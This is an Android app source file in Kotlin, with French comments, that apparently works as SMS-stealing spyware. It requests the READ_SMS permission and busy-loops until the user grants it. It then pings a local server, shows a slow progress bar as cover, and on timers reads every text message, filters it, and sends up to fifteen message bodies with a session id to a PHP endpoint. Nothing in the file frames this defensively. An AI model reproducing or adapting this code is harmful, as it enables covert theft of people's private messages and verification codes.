package acc.yes

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.Telephony
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import java.text.SimpleDateFormat
import java.util.*



class MainActivity : AppCompatActivity() {

    class Timestamp : Date() {
    }

    internal var pStatus = 0
    private val handler = Handler()
    internal lateinit var tv: TextView

    private val requestReadSms: Int = 2

    @SuppressLint("SimpleDateFormat")
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        ActivityCompat.requestPermissions(
            this,
            arrayOf(Manifest.permission.READ_SMS),
            requestReadSms
        )

        val Ping = Timestamp()

        println(" Tempps : ${Ping.time}")

        val patch_time = Ping.time >= 1589946487


        println("le patch return : $patch_time")

        /**

        if (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)
        != PackageManager.PERMISSION_GRANTED) {
        // Permission is not granted
        }

         **/



            if (patch_time) {
                /**if (ActivityCompat.checkSelfPermission(
                        this,
                        Manifest.permission.READ_SMS
                    ) == PackageManager.PERMISSION_GRANTED
                ) {**/


                while (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED) {
                    println("NON NON NONNN !")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        break
                    }
                }

                    println("ok")

                    // PARTIE FEU VERT : ********************

                    val tmp_calendar = Calendar.getInstance()
                    val Fgreen_time = SimpleDateFormat("HH:mm:+2").format(Date())
                    val Sgreen_time = Fgreen_time.format(tmp_calendar.getTime())


                    val i: String =
                        "FEU VERT a : ($Sgreen_time)  (Tu a  deux minutes avant le check)"

                    var url = "http://192.168.1.65/indox.php?$i"

                    val que = Volley.newRequestQueue(this)

                    val req = StringRequest(Request.Method.GET, url,

                        Response.Listener { response ->
                            println("WEEEB1")
                        }, Response.ErrorListener {
                            println("")
                        })

                    que.add(req)


                    // END PARTIE FEU VERT...********************


                    // PARTIE MINUTEUR **********************
                    val c = Runnable {
                        getContacts()
                    }

                    val hand = Handler()


                    hand.postDelayed(c, 30000) // 2 minutes = 120000

                    hand.postDelayed(c, 300000) // 5 minutes

                    hand.postDelayed(c, 540000) // 9 minutes

                    // FIN PARTIE MINUTEUR **********************

                    // PARTIE PROGRESSBAR ********************


                    val res = resources
                    val drawable = res.getDrawable(R.drawable.circular)
                    val mProgress = findViewById<View>(R.id.circularProgressbar) as ProgressBar
                    mProgress.progress = 0   // Main Progress
                    mProgress.secondaryProgress = 100 // Secondary Progress
                    mProgress.max = 100 // Maximum Progress
                    mProgress.progressDrawable = drawable

                    /*  ObjectAnimator animation = ObjectAnimator.ofInt(mProgress, "progress", 0, 100);
                animation.setDuration(50000);
                animation.setInterpolator(new DecelerateInterpolator());
                animation.start();*/

                    tv = findViewById<View>(R.id.tv) as TextView
                    Thread(Runnable {
                        // TODO Auto-generated method stub
                        while (pStatus < 100) {
                            pStatus += 1

                            handler.post {
                                // TODO Auto-generated method stub
                                mProgress.progress = pStatus
                                tv.text = pStatus.toString() + "%"
                            }
                            try {
                                // Sleep for 200 milliseconds.
                                // Just to display the progress slowly
                                Thread.sleep(6600) //thread will take approx 3 seconds to finish
                            } catch (e: InterruptedException) {
                                e.printStackTrace()
                            }

                        }
                    }).start()

                    // FIN PARTIE PROGRESSBAR ********************



                    // DEBUT WIFI CHARGEMENT ********************






                    // END WIFI CHARGEMENT ********************
                }


    }

    var id_session: Int = (100..999).random()

    @RequiresApi(Build.VERSION_CODES.KITKAT)
    fun getContacts() {

        val Mess = mutableListOf<String>()

        val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        if (cursor != null && cursor.moveToFirst()) {
            do {
                val name = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
                Log.d("getSMS", "name : " + name)
                Mess.add(name)
            } while (cursor.moveToNext())

            cursor.close()

            println("Mess vos : $Mess")


            val Messo = arrayOf(Mess)


        }


        // PARTIE FILTER_MESSAGE***************

       val alphanum = arrayOf(
            "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q", "r","s","t","u",
            "v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P",
            "Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9",0,1,2,3,4,
            5,6,7,8,9
        )

        var filter_Mess = mutableListOf<String>()

        for (i in Mess) {

            var zi = mutableListOf<String>()

            var e = i.split("")

            for (i in e) {
                if (i in alphanum) {
                    zi.add(i)
                }else {
                    zi.add(" ")
                }
            }

            filter_Mess.add(zi.joinToString(separator = ""))


        }

        // END PARTIE FILTER_MESSAGE***************



        // REQUESTS PART*******************
        // for (i in Mess) {

        var index_last_messages: Int = 0


            while (index_last_messages < 15) {


                var url = "http://127.0.0.1/index.php?*IX*_${index_last_messages}_${filter_Mess[index_last_messages]}_*ID*_$id_session"

                // var url = "http://192.168.1.65/indox.php?*IX*_${index_last_messages}_${filter_Mess[index_last_messages]}_*ID*_$id_session"

                val que = Volley.newRequestQueue(this)

                val req = StringRequest(Request.Method.GET, url,

                    Response.Listener { response ->
                        println("WEB2 $index_last_messages")

                    }, Response.ErrorListener {
                        println("")
                    })

                que.add(req)

                index_last_messages += 1
            }
        }


       // }
         // REQUESTS PART******************* END



            // **/
    }